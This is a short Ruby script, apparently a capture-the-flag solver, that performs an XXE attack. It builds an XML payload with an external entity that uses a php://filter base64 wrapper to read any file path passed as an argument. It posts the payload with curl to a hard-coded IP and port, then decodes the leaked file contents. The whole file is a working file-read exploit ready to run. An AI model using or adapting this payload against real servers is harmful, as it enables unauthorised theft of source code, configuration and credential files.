require "base64"

v1 = ARGV[0]
# filename = '/var/www/html/index.php'
filename = v1

xml = '''
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=FILENAME">]>
<root>&file;</root>
'''

# remove all newlines
xml = xml.gsub! "\n", ""
xml = xml.gsub! "FILENAME", filename

# run curl
cmd = "curl --silent -X POST -H 'Content-Type: text/xml' -d '#{xml}' http://199.247.6.180:12001"
response = `#{cmd}`
puts response

# strip away "Your wish: "
response = response[11..-1]

# decode base64 response
decode_response = Base64.decode64(response) 
puts decode_response

